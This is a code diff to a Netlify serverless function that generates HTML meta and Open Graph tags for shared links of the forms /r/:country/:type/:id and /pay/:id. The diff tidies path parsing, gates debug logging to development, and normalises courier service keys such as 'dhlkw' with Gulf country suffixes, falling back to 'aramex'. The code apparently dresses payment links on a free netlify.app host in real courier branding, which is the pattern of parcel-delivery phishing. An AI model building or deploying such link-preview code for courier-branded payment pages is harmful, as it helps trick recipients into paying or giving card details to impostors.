@@ -135,43 +135,34 @@ exports.handler = async (event, context) => {
   // Get query parameters
   const queryStringParameters = event.queryStringParameters || {};
   
-  // Get path - try multiple sources
-  // Netlify passes path in event.path, but redirects might pass it in query params
-  let originalPath = queryStringParameters.path || '';
+  // Determine the original path from multiple sources
+  // Priority: 1) query params (from redirects), 2) event.path, 3) event.rawPath
+  let originalPath = '';
   
-  if (!originalPath && event.path) {
-    originalPath = event.path;
-  } else if (!originalPath && event.rawPath) {
-    originalPath = event.rawPath;
-  }
-  
-  // Clean up path - remove function prefix if present
-  originalPath = originalPath.replace('/.netlify/functions/microsite-meta', '').replace(/^\//, '').replace(/\/$/, '') || '';
-  
-  // If path is in query params (from redirect), use it directly
+  // First, check if path was passed in query string (from _redirects)
   if (queryStringParameters.path) {
     originalPath = queryStringParameters.path;
   }
+  // If not in query, use event.path (Netlify automatically sets this from the redirect pattern)
+  else if (event.path) {
+    originalPath = event.path;
+  }
+  // Fallback to rawPath
+  else if (event.rawPath) {
+    originalPath = event.rawPath;
+  }
+  
+  // Remove function prefix if accidentally included
+  originalPath = originalPath.replace('/.netlify/functions/microsite-meta', '');
   
   // Ensure path starts with /
-  if (originalPath && !originalPath.startsWith('/')) {
+  if (!originalPath.startsWith('/')) {
     originalPath = '/' + originalPath;
   }
   
-  // If still empty, try to get from event.path (Netlify's path matching)
-  if (!originalPath || originalPath === '/') {
-    // Check if event.path contains the actual route
-    if (event.path && event.path.includes('/pay/')) {
-      originalPath = event.path;
-    } else if (event.path && event.path.includes('/r/')) {
-      originalPath = event.path;
-    } else if (event.path) {
-      originalPath = event.path;
-    }
-  }
+  // Remove trailing slash for consistency
+  originalPath = originalPath.replace(/\/$/, '') || '/';
   
-  // Final fallback
-  originalPath = originalPath || '/';
   const queryParams = queryStringParameters;
   
   // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
@@ -225,12 +216,14 @@ exports.handler = async (event, context) => {
     type = linkData.type;
   }
   
-  // Debug logging
-  console.log('Original Path:', originalPath);
-  console.log('Link ID:', id);
-  console.log('Link Data:', linkData);
-  console.log('Query Parameters:', queryParams);
-  console.log('Final Country:', countryCode, 'Type:', type);
+  // Debug logging (only in development)
+  if (process.env.NETLIFY_DEV) {
+    console.log('Original Path:', originalPath);
+    console.log('Link ID:', id);
+    console.log('Link Data:', linkData);
+    console.log('Query Parameters:', queryParams);
+    console.log('Final Country:', countryCode, 'Type:', type);
+  }
   
   let title = "";
   let description = "";
@@ -241,21 +234,25 @@ exports.handler = async (event, context) => {
     // Determine service key from multiple sources
     if (linkData?.payload?.service_key) {
       serviceKey = linkData.payload.service_key;
-      console.log('Using service_key from payload:', serviceKey);
     } else if (linkData?.payload?.service) {
       serviceKey = linkData.payload.service;
-      console.log('Using service from payload:', serviceKey);
     } else if (queryParams?.service) {
       serviceKey = queryParams.service;
-      console.log('Using service from query params:', serviceKey);
-    } else {
-      console.log('Using fallback service:', serviceKey);
     }
     
-    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
+    // Normalize service key (handle variations like dhlkw, dhlqa, etc.)
+    const normalizedKey = serviceKey.toLowerCase().replace(/[^a-z0-9]/g, '');
+    const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;
     
-    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
+    // Get service info - try exact match first, then base key, then fallback
+    let serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;
+    
+    // Ensure we have valid service info
+    if (!serviceInfo || !serviceInfo.description) {
+      serviceInfo = serviceData.aramex;
+    }
+    
+    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
     
     // Determine if this is a payment page or microsite
     const isPaymentPage = originalPath.startsWith('/pay/');
@@ -319,13 +316,26 @@ exports.handler = async (event, context) => {
   
   // Get site URL from headers or use default
   const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
-  const protocol = event.headers?.['x-forwarded-proto'] || 'https';
+  const protocol = event.headers?.['x-forwarded-proto'] || event.headers?.['X-Forwarded-Proto'] || 'https';
   const siteUrl = `${protocol}://${host}`;
-  const fullUrl = `${siteUrl}${originalPath}${Object.keys(queryParams).filter(k => k !== 'path').length > 0 ? '?' + Object.entries(queryParams).filter(([k]) => k !== 'path').map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&') : ''}`;
-  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
   
-  // Final debug logging
-  console.log('Final meta tags:', { title, description, ogImage: fullOgImage, serviceKey, fullUrl });
+  // Build full URL (exclude 'path' from query params as it's internal)
+  const queryString = Object.entries(queryParams)
+    .filter(([k]) => k !== 'path')
+    .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
+    .join('&');
+  const fullUrl = `${siteUrl}${originalPath}${queryString ? '?' + queryString : ''}`;
+  
+  // Ensure ogImage is absolute URL
+  let fullOgImage = ogImage;
+  if (!fullOgImage.startsWith('http')) {
+    fullOgImage = `${siteUrl}${fullOgImage.startsWith('/') ? '' : '/'}${fullOgImage}`;
+  }
+  
+  // Final debug logging (only in development)
+  if (process.env.NETLIFY_DEV) {
+    console.log('Final meta tags:', { title, description, ogImage: fullOgImage, serviceKey, fullUrl });
+  }
   
   // Generate HTML with proper meta tags
   const html = `<!DOCTYPE html>
